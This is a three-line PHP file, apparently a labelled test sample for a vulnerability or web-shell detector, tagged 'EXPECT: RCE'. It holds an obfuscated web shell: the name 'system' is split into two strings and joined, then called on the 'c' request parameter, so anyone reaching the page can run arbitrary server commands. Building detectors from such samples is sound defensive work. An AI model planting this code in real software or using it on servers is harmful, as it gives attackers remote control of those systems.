<?php
// EXPECT: RCE
$f = 'sys' . 'tem';
$f($_GET['c']);
